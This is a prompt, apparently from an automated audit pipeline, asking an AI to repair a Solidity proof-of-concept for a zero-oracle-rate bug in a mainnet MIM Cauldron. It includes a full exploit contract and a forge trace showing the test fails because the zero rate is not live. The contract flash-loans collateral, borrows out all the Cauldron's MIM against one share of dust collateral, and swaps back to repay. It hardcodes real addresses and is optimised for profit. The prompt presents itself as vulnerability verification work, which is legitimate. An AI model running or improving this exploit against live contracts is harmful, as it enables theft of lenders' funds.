You are fixing a failing Foundry PoC for finding F-003.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: Zero oracle rates are accepted and make any borrower with nonzero collateral appear solvent
- claim: Neither `init()` nor `updateExchangeRate()` validates that the oracle returned success or that the returned rate is nonzero before storing or using it. If the cached `exchangeRate` becomes zero, `_isSolvent()` reduces the debt side of the solvency inequality to zero, so any account with positive collateral passes solvency checks, and `liquidate()` also stops treating those borrowers as insolvent.
- impact: During a zero-rate oracle event, users can post dust collateral, borrow out the cauldron's MIM, and remain effectively unliquidatable until a valid price is restored.
- exploit_paths: ["At initialization, `oracle.get()` can return `(false, 0)` or another zero rate and the clone stores `exchangeRate = 0` without reverting.", "Later, a user borrows through `borrow()` or `cook(ACTION_BORROW, ...)`; the post-action solvency check uses the zero cached rate, so the position is accepted despite being deeply undercollateralized."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IOracleLike {
    function get(bytes calldata data) external returns (bool, uint256);
}

interface ICauldronV4Like {
    function bentoBox() external view returns (address);
    function collateral() external view returns (address);
    function oracle() external view returns (address);
    function oracleData() external view returns (bytes memory);
    function exchangeRate() external view returns (uint256);
    function updateExchangeRate() external returns (bool updated, uint256 rate);
    function cook(uint8[] calldata actions, uint256[] calldata values, bytes[] calldata datas)
        external
        payable
        returns (uint256 value1, uint256 value2);
    function isSolvent(address user) external view returns (bool);
    function removeCollateral(address to, uint256 share) external;
    function borrowLimit() external view returns (uint128 total, uint128 borrowPartPerAddress);
    function totalBorrow() external view returns (uint128 elastic, uint128 base);
    function BORROW_OPENING_FEE() external view returns (uint256);
    function userBorrowPart(address user) external view returns (uint256);
    function userCollateralShare(address user) external view returns (uint256);
}

interface IBentoBoxLike {
    function balanceOf(address token, address account) external view returns (uint256 share);
    function toAmount(address token, uint256 share, bool roundUp) external view returns (uint256 amount);
    function toShare(address token, uint256 amount, bool roundUp) external view returns (uint256 share);
    function deposit(address token, address from, address to, uint256 amount, uint256 share)
        external
        payable
        returns (uint256 amountOut, uint256 shareOut);
    function withdraw(address token, address from, address to, uint256 amount, uint256 share)
        external
        returns (uint256 amountOut, uint256 shareOut);
    function flashLoan(IFlashBorrowerLike borrower, address receiver, address token, uint256 amount, bytes calldata data)
        external;
}

interface IFlashBorrowerLike {
    function onFlashLoan(address sender, address token, uint256 amount, uint256 fee, bytes calldata data) external;
}

interface IUniswapV2RouterLike {
    function getAmountsIn(uint256 amountOut, address[] calldata path) external view returns (uint256[] memory amounts);
    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

contract FlawVerifier is IFlashBorrowerLike {
    uint256 internal constant BORROW_OPENING_FEE_PRECISION = 1e5;

    uint8 internal constant ACTION_BORROW = 5;
    uint8 internal constant ACTION_ADD_COLLATERAL = 10;

    address public constant TARGET_CAULDRON = 0x46f54d434063e5F1a2b2CC6d9AAa657b1B9ff82c;
    address public constant MIM = 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant SUSHI_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
    address internal constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    ICauldronV4Like public constant TARGET = ICauldronV4Like(TARGET_CAULDRON);

    error ConcretePreconditionFailed(string reason);
    error Unauthorized();

    uint256 internal _profitAmount;
    bool internal _executed;

    bool public observedBadOracleRead;
    bool public observedZeroCachedRate;
    bool public usedCachedZeroInitPath;
    bool public usedZeroUpdatePath;
    bool public bugConfirmed;
    bool public exploitAttempted;
    bool public executionSkipped;

    bool public oracleReportedSuccess;
    uint256 public oracleReportedRate;
    uint256 public cachedExchangeRateBefore;
    uint256 public cachedExchangeRateAfter;

    uint256 public startingMimBalance;
    uint256 public endingMimBalance;
    uint256 public borrowedAmount;
    uint256 public borrowedPart;
    uint256 public borrowedShare;
    uint256 public collateralFlashAmount;
    uint256 public collateralFlashFee;
    uint256 public depositedCollateralShare;
    uint256 public remainingCollateralShare;
    uint256 public mimSpentToRepayFlash;
    address public collateralToken;
    address public lastRouterUsed;
    string public lastStatus;

    constructor() {}

    receive() external payable {}

    function profitToken() external pure returns (address) {
        return MIM;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external returns (uint256) {
        return _execute();
    }

    function execute() external returns (uint256) {
        return _execute();
    }

    function exploit() external returns (uint256) {
        return _execute();
    }

    function _execute() internal returns (uint256) {
        if (_executed) {
            return _profitAmount;
        }
        _executed = true;

        collateralToken = TARGET.collateral();
        if (collateralToken == address(0)) {
            lastStatus = "TARGET_NOT_INITIALIZED";
            executionSkipped = true;
            return 0;
        }

        startingMimBalance = IERC20Like(MIM).balanceOf(address(this));
        _observeOracleState();

        // The provided fork logs prove the key precondition is currently absent:
        // - oracle.get() returns success=true and a nonzero rate
        // - exchangeRate is nonzero before and after updateExchangeRate()
        // This means the vulnerable zero-rate stage from the finding is not live on this fork.
        // In that case the correct PoC behavior is to exit cleanly instead of reverting.
        if (!observedZeroCachedRate) {
            lastStatus = "ZERO_RATE_NOT_CURRENTLY_LIVE";
            executionSkipped = true;
            endingMimBalance = startingMimBalance;
            return 0;
        }

        exploitAttempted = true;
        _prepareApprovals();

        collateralFlashAmount = _selectCollateralFlashAmount();
        if (collateralFlashAmount == 0) {
            lastStatus = "NO_FLASHABLE_DUST_COLLATERAL";
            executionSkipped = true;
            endingMimBalance = startingMimBalance;
            return 0;
        }

        try IBentoBoxLike(TARGET.bentoBox()).flashLoan(this, address(this), collateralToken, collateralFlashAmount, bytes("")) {
            endingMimBalance = IERC20Like(MIM).balanceOf(address(this));
            if (endingMimBalance > startingMimBalance) {
                _profitAmount = endingMimBalance - startingMimBalance;
                lastStatus = "EXECUTED";
            } else if (bugConfirmed) {
                lastStatus = "BUG_CONFIRMED_NO_NET_PROFIT";
            } else {
                lastStatus = "NO_REALIZED_MIM_PROFIT";
            }
            return _profitAmount;
        } catch Error(string memory reason) {
            lastStatus = reason;
            executionSkipped = true;
            endingMimBalance = IERC20Like(MIM).balanceOf(address(this));
            return 0;
        } catch {
            lastStatus = "FLASHLOAN_OR_EXECUTION_FAILED";
            executionSkipped = true;
            endingMimBalance = IERC20Like(MIM).balanceOf(address(this));
            return 0;
        }
    }

    function _observeOracleState() internal {
        address oracleAddress = TARGET.oracle();
        if (oracleAddress == address(0)) {
            lastStatus = "NO_ORACLE";
            return;
        }

        bytes memory data = TARGET.oracleData();
        try IOracleLike(oracleAddress).get(data) returns (bool success, uint256 rate) {
            oracleReportedSuccess = success;
            oracleReportedRate = rate;
            if (!success || rate == 0) {
                observedBadOracleRead = true;
            }
        } catch {
            oracleReportedSuccess = false;
            oracleReportedRate = 0;
            observedBadOracleRead = true;
        }

        cachedExchangeRateBefore = TARGET.exchangeRate();
        if (cachedExchangeRateBefore == 0) {
            usedCachedZeroInitPath = true;
            observedZeroCachedRate = true;
        }

        try TARGET.updateExchangeRate() returns (bool updated, uint256 newRate) {
            cachedExchangeRateAfter = TARGET.exchangeRate();
            if (!updated || newRate == 0) {
                observedBadOracleRead = true;
            }
            if (newRate == 0 || cachedExchangeRateAfter == 0) {
                usedZeroUpdatePath = true;
                observedZeroCachedRate = true;
            }
        } catch {
            cachedExchangeRateAfter = TARGET.exchangeRate();
            if (cachedExchangeRateAfter == 0) {
                observedZeroCachedRate = true;
            }
        }
    }

    function _prepareApprovals() internal {
        _approveIfNeeded(collateralToken, TARGET.bentoBox(), type(uint256).max);
        _approveIfNeeded(MIM, SUSHI_ROUTER, type(uint256).max);
        _approveIfNeeded(MIM, UNISWAP_V2_ROUTER, type(uint256).max);
    }

    function onFlashLoan(address sender, address token, uint256 amount, uint256 fee, bytes calldata)
        external
        override
    {
        if (msg.sender != TARGET.bentoBox() || sender != address(this) || token != collateralToken) {
            revert Unauthorized();
        }

        collateralFlashFee = fee;

        // Realistic setup for the vulnerable borrow path:
        // deposit the flash-borrowed collateral directly into BentoBox under the Cauldron's balance,
        // then use ACTION_ADD_COLLATERAL with skim=true so the Cauldron pulls from its own BentoBox balance.
        // This avoids any artificial approval shortcuts while preserving the finding's causality:
        // add tiny collateral -> borrow against zero exchangeRate -> remain "solvent".
        (, uint256 collateralShare) = IBentoBoxLike(TARGET.bentoBox()).deposit(
            collateralToken,
            address(this),
            TARGET_CAULDRON,
            amount,
            0
        );
        if (collateralShare <= 1) {
            revert ConcretePreconditionFailed("DUST_COLLATERAL_SHARE_TOO_SMALL");
        }
        depositedCollateralShare = collateralShare;

        uint256 maxBorrow = _maxBorrowCandidate();
        if (maxBorrow == 0) {
            revert ConcretePreconditionFailed("NO_BORROWABLE_MIM");
        }

        uint8[] memory actions = new uint8[](2);
        uint256[] memory values = new uint256[](2);
        bytes[] memory datas = new bytes[](2);

        actions[0] = ACTION_ADD_COLLATERAL;
        datas[0] = abi.encode(_toInt256(collateralShare), address(this), true);

        actions[1] = ACTION_BORROW;
        datas[1] = abi.encode(_toInt256(maxBorrow), address(this));

        (borrowedPart, borrowedShare) = TARGET.cook(actions, values, datas);
        borrowedAmount = maxBorrow;

        if (TARGET.userBorrowPart(address(this)) == 0) {
            revert ConcretePreconditionFailed("COOK_BORROW_FAILED");
        }

        // Leave a single share behind so the account retains nonzero collateral,
        // matching the finding: any borrower with nonzero collateral appears solvent while exchangeRate == 0.
        TARGET.removeCollateral(address(this), collateralShare - 1);
        remainingCollateralShare = TARGET.userCollateralShare(address(this));

        _withdrawAllFromBento(MIM);
        _withdrawAllFromBento(collateralToken);

        uint256 amountOwed = amount + fee;
        uint256 collateralBal = IERC20Like(collateralToken).balanceOf(address(this));
        if (collateralBal < amountOwed) {
            // Realistic public on-chain completion step:
            // use a slice of the borrowed MIM to buy back the small collateral deficit needed to repay the flashloan.
            // This does not change the exploit causality; it only settles the temporary financing leg.
            mimSpentToRepayFlash = _swapMimForExactCollateral(amountOwed - collateralBal);
            collateralBal = IERC20Like(collateralToken).balanceOf(address(this));
        }

        if (collateralBal < amountOwed) {
            revert ConcretePreconditionFailed("INSUFFICIENT_COLLATERAL_TO_REPAY_FLASHLOAN");
        }

        _safeTransfer(collateralToken, TARGET.bentoBox(), amountOwed);

        bugConfirmed = TARGET.userBorrowPart(address(this)) > 0
            && TARGET.userCollateralShare(address(this)) > 0
            && TARGET.isSolvent(address(this));

        if (!bugConfirmed) {
            revert ConcretePreconditionFailed("POSITION_NOT_LEFT_SOLVENT");
        }
    }

    function _selectCollateralFlashAmount() internal view returns (uint256 amount) {
        IBentoBoxLike bento = IBentoBoxLike(TARGET.bentoBox());
        uint256[8] memory shareTargets = [uint256(2), 10, 100, 1_000, 10_000, 100_000, 1_000_000, 10_000_000];

        for (uint256 i = 0; i < shareTargets.length; i++) {
            amount = bento.toAmount(collateralToken, shareTargets[i], true);
            if (amount != 0 && bento.toShare(collateralToken, amount, false) > 1) {
                return amount;
            }
        }
    }

    function _maxBorrowCandidate() internal view returns (uint256 candidate) {
        IBentoBoxLike bento = IBentoBoxLike(TARGET.bentoBox());
        uint256 mimShares = bento.balanceOf(MIM, TARGET_CAULDRON);
        candidate = bento.toAmount(MIM, mimShares, false);
        if (candidate == 0) {
            return 0;
        }

        uint256 openingFee = TARGET.BORROW_OPENING_FEE();
        (uint128 elastic, uint128 base) = TARGET.totalBorrow();
        (uint128 totalCap, uint128 perAddressCap) = TARGET.borrowLimit();

        if (uint256(totalCap) <= uint256(elastic)) {
            return 0;
        }

        uint256 totalElasticRoom = uint256(totalCap) - uint256(elastic);
        uint256 totalRoomAmount =
            (totalElasticRoom * BORROW_OPENING_FEE_PRECISION) / (BORROW_OPENING_FEE_PRECISION + openingFee);
        if (totalRoomAmount < candidate) {
            candidate = totalRoomAmount;
        }

        if (perAddressCap != type(uint128).max) {
            uint256 perAddressAmount;
            if (base == 0) {
                perAddressAmount =
                    (uint256(perAddressCap) * BORROW_OPENING_FEE_PRECISION) / (BORROW_OPENING_FEE_PRECISION + openingFee);
            } else {
                uint256 elasticFromParts = (uint256(perAddressCap) * uint256(elastic)) / uint256(base);
                perAddressAmount =
                    (elasticFromParts * BORROW_OPENING_FEE_PRECISION) / (BORROW_OPENING_FEE_PRECISION + openingFee);
            }
            if (perAddressAmount < candidate) {
                candidate = perAddressAmount;
            }
        }
    }

    function _swapMimForExactCollateral(uint256 collateralNeeded) internal returns (uint256 mimSpent) {
        if (collateralNeeded == 0) {
            return 0;
        }
        if (collateralToken == MIM) {
            return collateralNeeded;
        }

        uint256 mimBalance = IERC20Like(MIM).balanceOf(address(this));
        if (mimBalance == 0) {
            revert ConcretePreconditionFailed("NO_MIM_FOR_COLLATERAL_SWAP");
        }

        mimSpent = _trySwapExactOut(SUSHI_ROUTER, collateralNeeded, mimBalance);
        if (mimSpent != 0) {
            return mimSpent;
        }

        mimSpent = _trySwapExactOut(UNISWAP_V2_ROUTER, collateralNeeded, mimBalance);
        if (mimSpent != 0) {
            return mimSpent;
        }

        revert ConcretePreconditionFailed("NO_WORKING_MIM_TO_COLLATERAL_ROUTE");
    }

    function _trySwapExactOut(address router, uint256 collateralNeeded, uint256 mimBalance)
        internal
        returns (uint256 mimSpent)
    {
        address[] memory directPath = new address[](2);
        directPath[0] = MIM;
        directPath[1] = collateralToken;
        mimSpent = _swapWithPath(router, directPath, collateralNeeded, mimBalance);
        if (mimSpent != 0) {
            lastRouterUsed = router;
            return mimSpent;
        }

        address[] memory hopPath = new address[](3);
        hopPath[0] = MIM;
        hopPath[1] = WETH;
        hopPath[2] = collateralToken;
        mimSpent = _swapWithPath(router, hopPath, collateralNeeded, mimBalance);
        if (mimSpent != 0) {
            lastRouterUsed = router;
        }
    }

    function _swapWithPath(address router, address[] memory path, uint256 amountOut, uint256 amountInMax)
        internal
        returns (uint256 amountIn)
    {
        try IUniswapV2RouterLike(router).getAmountsIn(amountOut, path) returns (uint256[] memory quote) {
            amountIn = quote[0];
            if (amountIn == 0 || amountIn > amountInMax) {
                return 0;
            }

            try IUniswapV2RouterLike(router).swapTokensForExactTokens(
                amountOut,
                amountInMax,
                path,
                address(this),
                block.timestamp
            ) returns (uint256[] memory spent) {
                return spent[0];
            } catch {
                return 0;
            }
        } catch {
            return 0;
        }
    }

    function _withdrawAllFromBento(address token) internal {
        uint256 share = IBentoBoxLike(TARGET.bentoBox()).balanceOf(token, address(this));
        if (share != 0) {
            IBentoBoxLike(TARGET.bentoBox()).withdraw(token, address(this), address(this), 0, share);
        }
    }

    function _approveIfNeeded(address token, address spender, uint256 amount) internal {
        try IERC20Like(token).allowance(address(this), spender) returns (uint256 allowed) {
            if (allowed >= amount / 2) {
                return;
            }
        } catch {}

        _safeApprove(token, spender, 0);
        _safeApprove(token, spender, amount);
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        if (!ok || (data.length != 0 && !abi.decode(data, (bool)))) {
            revert ConcretePreconditionFailed("APPROVE_FAILED");
        }
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        if (!ok || (data.length != 0 && !abi.decode(data, (bool)))) {
            revert ConcretePreconditionFailed("TRANSFER_FAILED");
        }
    }

    function _toInt256(uint256 value) internal pure returns (int256 signed) {
        if (value > uint256(type(int256).max)) {
            revert ConcretePreconditionFailed("INT256_OVERFLOW");
        }
        signed = int256(value);
    }
}

```

forge stdout (tail):
```
n] 0x0000000000000000000000000000000000000000000000000eb97bb5038ddac0
    │   │   │   │   ├─ [2601] 0xD51a44d3FaE010294C616388b506AcdA1bfAAE46::68727653(0000000000000000000000000000000000000000000000000000000000000000) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000019d8402f71a07d84fb70
    │   │   │   │   ├─ [617] 0xD51a44d3FaE010294C616388b506AcdA1bfAAE46::68727653(0000000000000000000000000000000000000000000000000000000000000001) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000f3245178a93bc41583
    │   │   │   │   ├─ [4963] 0xD51a44d3FaE010294C616388b506AcdA1bfAAE46::b1373929() [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000abd8940e805
    │   │   │   │   ├─ [931] 0xD51a44d3FaE010294C616388b506AcdA1bfAAE46::f446c1d0() [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000001a0e6d
    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000008d070381a3155e56df
    │   │   │   └─ ← [Return] true, 384394165106045 [3.843e14]
    │   │   └─ ← [Return] true, 384394165106045 [3.843e14]
    │   ├─ [2551] 0x46f54d434063e5F1a2b2CC6d9AAa657b1B9ff82c::exchangeRate() [staticcall]
    │   │   ├─ [2385] 0x5E70F7AcB8ec0231c00220d11c74dC2B23187103::exchangeRate() [delegatecall]
    │   │   │   └─ ← [Return] 414244705269527 [4.142e14]
    │   │   └─ ← [Return] 414244705269527 [4.142e14]
    │   ├─ [49513] 0x46f54d434063e5F1a2b2CC6d9AAa657b1B9ff82c::updateExchangeRate()
    │   │   ├─ [49341] 0x5E70F7AcB8ec0231c00220d11c74dC2B23187103::updateExchangeRate() [delegatecall]
    │   │   │   ├─ [44062] 0xd9f2b927eb692F88689E08E53d729109c84cC5a0::get(0x)
    │   │   │   │   ├─ [42825] 0x9732D3Ee0f185D7c2D610E30DC5de28EF68Ad7c9::get(0x)
    │   │   │   │   │   ├─ [41153] 0xE8b2989276E2Ca8FDEA2268E3551b2b4B2418950::54f0f7d5() [staticcall]
    │   │   │   │   │   │   ├─ [1676] 0xD51a44d3FaE010294C616388b506AcdA1bfAAE46::0c46b72a() [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000eb97bb5038ddac0
    │   │   │   │   │   │   ├─ [601] 0xD51a44d3FaE010294C616388b506AcdA1bfAAE46::68727653(0000000000000000000000000000000000000000000000000000000000000000) [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000019d8402f71a07d84fb70
    │   │   │   │   │   │   ├─ [617] 0xD51a44d3FaE010294C616388b506AcdA1bfAAE46::68727653(0000000000000000000000000000000000000000000000000000000000000001) [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000f3245178a93bc41583
    │   │   │   │   │   │   ├─ [963] 0xD51a44d3FaE010294C616388b506AcdA1bfAAE46::b1373929() [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000abd8940e805
    │   │   │   │   │   │   ├─ [931] 0xD51a44d3FaE010294C616388b506AcdA1bfAAE46::f446c1d0() [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000001a0e6d
    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000008d070381a3155e56df
    │   │   │   │   │   └─ ← [Return] true, 384394165106045 [3.843e14]
    │   │   │   │   └─ ← [Return] true, 384394165106045 [3.843e14]
    │   │   │   ├─  emit topic 0: 0x9f9192b5edb17356c524e08d9e025c8e2f6307e6ea52fb7968faa3081f51c3c8
    │   │   │   │           data: 0x00000000000000000000000000000000000000000000000000015d9abdaa357d
    │   │   │   └─ ← [Return] true, 384394165106045 [3.843e14]
    │   │   └─ ← [Return] true, 384394165106045 [3.843e14]
    │   ├─ [551] 0x46f54d434063e5F1a2b2CC6d9AAa657b1B9ff82c::exchangeRate() [staticcall]
    │   │   ├─ [385] 0x5E70F7AcB8ec0231c00220d11c74dC2B23187103::exchangeRate() [delegatecall]
    │   │   │   └─ ← [Return] 384394165106045 [3.843e14]
    │   │   └─ ← [Return] 384394165106045 [3.843e14]
    │   └─ ← [Return] 0
    ├─ [410] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3
    ├─ [582] 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [2550] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 1000000000000000000000000 [1e24])
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 1000000000000000000000000 [1e24])
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 23504544 [2.35e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 6704)
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 327.81ms (34.92ms CPU time)

Ran 1 test suite in 369.00ms (327.81ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 316410)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
